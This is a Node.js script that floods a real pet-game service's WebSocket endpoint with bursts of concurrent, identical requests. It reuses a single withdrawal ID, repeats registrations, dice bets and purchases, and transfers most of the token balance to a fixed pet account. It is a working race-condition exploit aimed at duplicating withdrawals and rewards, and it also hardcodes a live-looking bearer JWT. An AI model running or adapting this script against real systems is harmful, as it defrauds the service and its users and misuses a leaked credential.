import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

/** ====== ENV / CONSTANTS ====== */
const endpoint = "wss://petbot-monorepo-websocket-333713154917.europe-west1.run.app/";
const origin = "https://app.pett.ai";

// Name & JWT (replace as needed)
const pettName = `discarded_${Math.floor(Math.random() * 999999)}_t1`;
const jwt =
  "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWZqdGhvczIwMDAzbDUwYm53OWxmdnMyIiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NTg0MjI4MTksImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21lMTF6bG16MDBrdmw1MGJjeXM2b3psaiIsImV4cCI6MTc1ODQyNjQxOX0.5Ksy3xLXFc1ODbBcexx25EBekMcMEG1AW2JL5nWuH88mYGM5sysGWflZNz6DpoFJMUdaJtaUCIU_gffa7sGhKQ"

// Start mode
let type = "jump"; // "register" | "withdraw" | "food" | "atm" | "dice" | "jump" | "door"
const useAtm = false;

/** ====== TUNABLE CONNECT LIMITS ====== */
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

const CONNECT_STAGGER_MS = 75;       // time between scheduling new connects
const CONNECT_TIMEOUT_MS = 15000;    // handshake deadline per socket
const MAX_CONNECT_RETRIES = 4;       // retries per socket
const MAX_CONCURRENT_CONNECTS = 40;  // simultaneous TCP/TLS handshakes

let inFlightConnects = 0;

/** ====== BEHAVIOR KNOBS ====== */
// Delay after first AUTH (per socket) before sending FOOD/ATM action
const DELAY_AFTER_AUTH_MS = 2000;

// Level-based switching
let currentLevel = 0;
let levelAim = 50;

// Token balance (populated from server messages)
let tokenBalance = 0;

// Internal counters
let totalSent = 0;
let totalReceived = 0; // “user already created” count
let waveCounter = 0;
let blasting = false;
let sendingStarted = false;

// Sockets state & timers
let sockets = []; // [{ ws, id, didAuth, withdrawalId }]
let pendingOpenType = null;
let blastTimer = null;
let restTimer = null;
let atmInterval = null;

/** ====== WITHDRAWALS POOL ====== */
const withdrawalIds = [
"3ab03888-2a67-48fe-9dfa-918de5ab40ba",
"3ab03888-2a67-48fe-9dfa-918de5ab40ba",
"3ab03888-2a67-48fe-9dfa-918de5ab40ba"
];

const shuffled = [...withdrawalIds].sort(() => Math.random() - 0.5);

let index = 0;
const pickWithdrawalId = () => {
  if (index < shuffled.length) {
    return shuffled[index++];  // next unique ID
  } else {
    return null;               // no IDs left
  }
};


/** ====== HELPERS ====== */
const uniqueNonce = () => uuidv4();

const chooseDiceBet = (mode = "number") => {
  if (mode === "number") {
    // if (Math.random() < 0.7) return Math.random() < 0.5 ? 3 : 4;
    if (Math.random() < 0.8) return Math.random() < 0.5 ? 1 : 4;
    return Math.floor(Math.random() * 6) + 1;
  }
  return mode.toUpperCase() === "EVEN" ? "EVEN" : "ODD";
};

/** ====== MESSAGE BUILDERS ====== */
const makeRegisterString = () => JSON.stringify({
  type: "REGISTER",
  data: { params: { authType: "privy", registerHash: { hash: jwt, name: pettName } } },
  nonce: uniqueNonce(),
});

const makeAuthString = () => JSON.stringify({
  type: "AUTH",
  data: { params: { authType: "privy", authHash: { hash: jwt } } },
  nonce: uniqueNonce(),
});

const makeWithdrawString = (withdrawalId) => JSON.stringify({
  type: "WITHDRAWAL_USE",
  data: { params: { withdrawalId } },
  nonce: uniqueNonce(),
});

const makeJumpString = (withdrawalId) => JSON.stringify({
  type: "WITHDRAWAL_JUMP",
  data: { params: { withdrawalId } },
  nonce: uniqueNonce(),
});

const makeDoorString = () => JSON.stringify({
  type: "PLAY_DOORS",
  data: {},
  nonce: uniqueNonce(),
});

// const makeBuyString = () => JSON.stringify({
//   type: "CONSUMABLES_BUY",
//   data: { params: { foodId: "ENERGIZER", amount: 1 /*+ Math.random() * 0.01 */} },
//   nonce: uniqueNonce(),
// });

const makeBuyString = () => JSON.stringify({
  type: "CONSUMABLES_BUY",
  data: { params: { foodId: "ENERGIZER", amount: 1 /*+ Math.random() * 0.01 */} },
  nonce: uniqueNonce(),
});

const makeDiceString = (betAmount, mode) => JSON.stringify({
  type: "PLAY_DICE",
  data: {
    params: { betAmount, selectedBet: { number: chooseDiceBet(mode), type: "number" } },
  },
  nonce: uniqueNonce(),
});

const makeAtmString = () => {
  const amountToSend = Math.floor(tokenBalance - (tokenBalance * 10 / 100));
  return JSON.stringify({
    type: "TRANSFER",
    data: {
      params: {
        petTo: "23d430f9-e9f8-4788-a1a3-97c9476dad28",
        amount: Math.round(amountToSend - (amountToSend * 0.1 / 100)),
      }
    },
    nonce: uniqueNonce(),
  });
};

/** ====== CONFIGS ====== */
const rand1to10 = () => 10;

const CONFIGS = {
  register: {
    TOTAL_SOCKETS: 25,
    REQUESTS_PER_SOCKET: 1500,
    BLAST_DURATION_MS: 1000,
    REST_BETWEEN_WAVES_MS: 30000,
  },
  withdraw: {
    TOTAL_SOCKETS: 1,
    REQUESTS_PER_SOCKET: 5,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 1000,
  },
  food: {
    // TOTAL_SOCKETS: rand1to10(),
    TOTAL_SOCKETS: 2,
    REQUESTS_PER_SOCKET: 5,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 1000,
  },
  atm: {
    TOTAL_SOCKETS: 3,
    REQUESTS_PER_SOCKET: 1, // unused by the interval, kept for symmetry
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 2000,
  },
  door: {
    TOTAL_SOCKETS: 10,
    REQUESTS_PER_SOCKET: 20,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
  },
  dice: {
    TOTAL_SOCKETS: 4,
    REQUESTS_PER_SOCKET: 20,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
  },
  jump: {
    TOTAL_SOCKETS: 10,
    REQUESTS_PER_SOCKET: 5,
    BLAST_DURATION_MS: 40,
    REST_BETWEEN_WAVES_MS: 500,
  },
};

const NEEDS_AUTH_FIRST = new Set(["withdraw", "food", "atm", "dice", "door", "jump"]);

/** ====== ACTION SENDER (AUTH-once per socket + optional delay for food/atm) ====== */
async function sendActionForSocket(sock) {
  if (sock.ws.readyState !== WebSocket.OPEN) return;

  if (NEEDS_AUTH_FIRST.has(type) && !sock.didAuth) {
    sock.ws.send(makeAuthString());
    sock.didAuth = true;
    if (type === "food" || type === "atm") {
      await sleep(DELAY_AFTER_AUTH_MS);
    }
  }

  switch (type) {
    case "register":
      sock.ws.send(makeRegisterString());
      break;
    case "withdraw":
      const nextId = pickWithdrawalId();
      if (nextId) {
        sock.ws.send(makeWithdrawString(sock.withdrawalId ?? (sock.withdrawalId = nextId)));
      } else {
        console.log("🚫 No withdrawal IDs left to use");
      }
      break;
    case "food":
      sock.ws.send(makeBuyString());
      break;
    case "atm":
      sock.ws.send(makeAtmString());
      break;
    case "door":
      sock.ws.send(makeDoorString());
      break;
    case "dice":
      sock.ws.send(makeDiceString(5000, "number"));
      break;
    case "jump":
      sock.ws.send(makeJumpString(sock.withdrawalId ?? (sock.withdrawalId = pickWithdrawalId())));
      break;
    default:
      break;
  }
}

/** ====== BLAST LOOP (non-ATM) ====== */
function blastWave() {
  if (type === "atm") return;

  const cfg = CONFIGS[type];
  const live = sockets.filter(s => s.ws.readyState === WebSocket.OPEN);
  if (!live.length) {
    console.log("⚠ No live sockets remain, stopping waves");
    blasting = false;
    sendingStarted = false;
    return;
  }

  blasting = true;
  waveCounter++;
  let sentThisWave = 0;
  const interval = cfg.BLAST_DURATION_MS / cfg.REQUESTS_PER_SOCKET;

  for (const sock of live) {
    for (let j = 0; j < cfg.REQUESTS_PER_SOCKET; j++) {
      setTimeout(() => {
        Promise.resolve(sendActionForSocket(sock)).then(() => {
          sentThisWave++;
        }).catch(() => {});
      }, j * interval);
    }
  }

  blastTimer = setTimeout(() => {
    totalSent += sentThisWave;
    console.log(`⚡ Wave #${waveCounter}: sent=${sentThisWave} · liveSockets=${live.length} · totalSent=${totalSent}`);
    blasting = false;
    restTimer = setTimeout(blastWave, cfg.REST_BETWEEN_WAVES_MS);
  }, cfg.BLAST_DURATION_MS + 20);
}

/** ====== ATM LOOP ====== */
function startAtmLoop() {
  clearAtmLoop();
  const cfg = CONFIGS.atm;
  atmInterval = setInterval(() => {
    if (!useAtm) return;
    const live = sockets.filter(s => s.ws.readyState === WebSocket.OPEN);
    if (!live.length) return;
    for (const sock of live) { sendActionForSocket(sock); }
    console.log("🏧 ATM tick sent across live sockets");
  }, cfg.REST_BETWEEN_WAVES_MS);
}
function clearAtmLoop() {
  if (atmInterval) { clearInterval(atmInterval); atmInterval = null; }
}

/** ====== START SENDING WHEN ALL CONNECTED ====== */
function startSendingIfReady() {
  const cfg = CONFIGS[type];
  if (sendingStarted) return;
  if (sockets.length !== cfg.TOTAL_SOCKETS) return;

  sendingStarted = true;
  console.log(`🚀 All ${cfg.TOTAL_SOCKETS} sockets connected — starting ${type.toUpperCase()} loop`);
  if (type === "atm") startAtmLoop();
  else blastWave();
}

/** ====== SWITCH TYPE (close all, then reopen with throttled connect) ====== */
function switchType(newType) {
  if (type === newType) return;
  console.log(`🔄 Switching type: ${type} → ${newType}`);

  if (blastTimer) clearTimeout(blastTimer);
  if (restTimer) clearTimeout(restTimer);
  clearAtmLoop();
  blasting = false;
  sendingStarted = false;

  pendingOpenType = newType;

  for (const s of sockets) {
    try { s.ws.close(); } catch {}
  }
}

/** ====== OPEN PENDING TYPE WHEN ALL CLOSED ====== */
function openPendingTypeIfAny() {
  if (!pendingOpenType) return;
  if (sockets.length !== 0) return;

  type = pendingOpenType;
  pendingOpenType = null;

  if (type === "food") CONFIGS[type].TOTAL_SOCKETS = rand1to10();

  console.log(`🔌 Opening ${CONFIGS[type].TOTAL_SOCKETS} sockets in ${type.toUpperCase()} mode...`);
  bootOpenSockets(CONFIGS[type].TOTAL_SOCKETS).catch(err => {
    console.error("❌ bootOpenSockets error:", err?.message || err);
  });
}

/** ====== MESSAGE HANDLER (factory) ====== */
function onMessageFactory(sock) {
  return async (m) => {
    let msg;
    try { msg = JSON.parse(m.toString()); }
    catch { console.log("📩 (non-JSON message)", m.toString()); return; }

    const lower = msg?.error?.toLowerCase?.();
    if (lower && lower !== 'too many requests. please wait to try again.') {
      console.log(msg.error);
    }

    const data = msg?.data;
    if (data) {
      console.log(msg)
    }

    // console.log(msg);

    // Level tracking
    if (msg?.pet?.PetStats?.level != null) {
      currentLevel = Number(msg.pet.PetStats.level);
      console.log(`📊 Current level: ${currentLevel}`);
      if (currentLevel >= levelAim && type !== "atm" && useAtm === true) {
        console.log(`🏁 Level ≥ ${levelAim} — switching to ATM`);
        switchType("atm");
      } else if (currentLevel >= levelAim && type === 'food') return console.log('🍗 Level Reached!')
    }

    // Token balance tracking
    if (msg?.pet?.PetTokens?.tokens != null) {
      tokenBalance = Number(msg.pet.PetTokens.tokens);
      const display = Math.floor(tokenBalance / 1e18);
      console.log(`💰 Token balance: ${display}`);
    }

    // “user already created” counter (your prior signal)
    if (typeof msg.error === "string" && lower === "user already created") {
      totalReceived += 1;
      console.log("Total cm Received=" + totalReceived);
      if (totalReceived > 1 && type !== "food" && type !== "atm") {
        console.log("⏳ Wait 3s for backend");
        await sleep(3000);
        console.log("🍗 CM > 1 — switching to FOOD");
        switchType("food");
      }
    }
  };
}

/** ====== CONNECT (one socket) WITH TIMEOUT ====== */
function connectSocketOnce(socketId) {
  return new Promise((resolve, reject) => {
    const headers = { Origin: origin, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" };
    const ws = new WebSocket(endpoint, { headers, perMessageDeflate: false });
    const sock = { ws, id: socketId, didAuth: false, withdrawalId: undefined };

    let settled = false;
    const to = setTimeout(() => {
      if (settled) return;
      settled = true;
      try { ws.terminate(); } catch {}
      reject(new Error("connect_timeout"));
    }, CONNECT_TIMEOUT_MS);

    ws.on("open", () => {
      if (settled) return;
      settled = true;
      clearTimeout(to);

      // keepalive ping
      try {
        ws.ping();
        ws._pingInterval = setInterval(() => {
          if (ws.readyState === WebSocket.OPEN) ws.ping();
        }, 30000);
      } catch {}

      sockets.push(sock);
      console.log(`✅ Socket ${socketId} connected (${sockets.length}/${CONFIGS[type].TOTAL_SOCKETS})`);
      ws.on("message", onMessageFactory(sock));
      startSendingIfReady();
      resolve();
    });

    ws.on("close", () => {
      console.log(`🔒 Socket ${socketId} closed`);
      if (ws._pingInterval) { clearInterval(ws._pingInterval); ws._pingInterval = null; }
      sockets = sockets.filter(s => s.id !== socketId);
      if (!settled) {
        settled = true;
        clearTimeout(to);
        reject(new Error("closed_before_open"));
      }
      if (sockets.length === 0) openPendingTypeIfAny();
    });

    ws.on("error", (err) => {
      console.error(`❌ Socket ${socketId} error:`, err?.message || err);
      if (!settled) {
        settled = true;
        clearTimeout(to);
        try { ws.terminate(); } catch {}
        reject(err || new Error("ws_error"));
      }
    });
  });
}

/** ====== RETRY WRAPPER ====== */
async function connectSocketWithRetry(socketId, attempt = 1) {
  try {
    await connectSocketOnce(socketId);
  } catch (err) {
    if (attempt > MAX_CONNECT_RETRIES) {
      console.warn(`⚠️ Socket ${socketId} failed after ${attempt - 1} retries: ${err?.message || err}`);
      return;
    }
    // exponential backoff + jitter
    let backoff = 200 * Math.pow(2, attempt - 1);
    backoff = Math.floor(backoff * (0.75 + Math.random() * 0.5));
    console.warn(`↻ Retry socket ${socketId} attempt ${attempt} in ${backoff}ms (${err?.message || err})`);
    await sleep(backoff);
    return connectSocketWithRetry(socketId, attempt + 1);
  }
}

/** ====== BOOT OPEN (throttled, concurrency-limited) ====== */
async function bootOpenSockets(target) {
  const ids = Array.from({ length: target }, (_, i) => i + 1);
  for (const id of ids) {
    // concurrency gate
    while (inFlightConnects >= MAX_CONCURRENT_CONNECTS) {
      await sleep(10);
    }
    inFlightConnects++;
    await sleep(CONNECT_STAGGER_MS); // smooth out bursts

    connectSocketWithRetry(id)
      .finally(() => { inFlightConnects = Math.max(0, inFlightConnects - 1); });
  }
}

/** ====== BOOT ====== */
console.log(`🔌 Opening ${CONFIGS[type].TOTAL_SOCKETS} sockets in ${type.toUpperCase()} mode...`);
bootOpenSockets(CONFIGS[type].TOTAL_SOCKETS).catch(err => {
  console.error("❌ bootOpenSockets fatal:", err?.message || err);
});